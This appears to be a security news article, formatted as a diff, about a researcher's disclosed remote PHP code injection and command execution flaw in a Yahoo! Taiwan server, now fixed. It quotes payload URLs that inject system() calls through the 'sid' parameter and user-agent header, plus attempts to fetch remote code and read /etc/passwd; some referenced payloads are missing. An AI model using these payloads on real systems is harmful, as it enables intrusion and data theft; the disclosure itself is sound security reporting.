@@ -1,0 +1,25 @@
+
+					Discovered a Remote Command Execution Vulnerability in Yahoo!					
+The cyber security expert Ebrahim Hegazy has found a serious flaw, as explained by the analyst the website is affected by a Remote Code Execution vulnerability. During the test Hegazy discovered first a Remote PHP Code Injection vulnerability that later escalated to “Remote Command Execution”. The hacker found the vulnerability at the link
+that refers a Yahoo! server which hosts numerous subdomains of the company. The payload used to exploit the flaw was
+What is “Remote PHP Code Injection” ?
+A PHP Code Injection flaw allows an attacker to execute PHP code such as system(“id”) or any other php function/code, it occurs when user  sends untrusted data to the target through (GET/POST) values of the parameters that are reflected inside eval() function.
+Ebrahim Hegazy succeeded to inject PHP code by manipulating the value of the parameter “sid”, in the beginning he tried to check the directories and files by “dir” using the SYSTEM function:
+http://tw.user.mall.yahoo.com/rating/list?sid=${@print(system(“dir”))}
+
+He also tried with system(“ls -la”) but he noted that the target doesn’t accept any spaces in the URL.
+The expert decided to try to use URL ENCODING for space character using %20 but without success, same result with double URL encoding.
+He also tried to circumvent the security feature by using the function file_get_contents(“http://sec-down.com/poc.txt”) but also this test doesn’t work because of the folder permissions.
+Finally Ebrahim tried the following procedure:
+The expert knowing that Netcat could trigger defense systems, including any simple AV/IDS on the target he tried another method for the attack.
+Thanks to Ahmed Abul-Ela and Ibrahim Mosaad he was able to execute commands using system($_POST[‘x2’])
+POC:
+Also by using  system($_SERVER[‘HTTP_USER_AGENT’]) and then inject my commands inside the userAgent.
+E.g, http://tw.user.mall.yahoo.com/rating/list?sid=${@print($_SERVER[‘HTTP_USER_AGENT’])}
+He noted that there have been other good tricks such as using readfile(“/etc/passwd”).
+Sample POC for the Vulnerability [Allowed by Yahoo! to be public]:
+
+Timeline of the Flaw Remote Command Execution Vulnerability in Yahoo!
+Thanks to Yahoo! Security team for the fast fix release, BTW No news about the bounty yet!
+Pierluigi Paganini
+(Security Affairs –  Remote Command Execution Vulnerability, Yahoo, hacking)
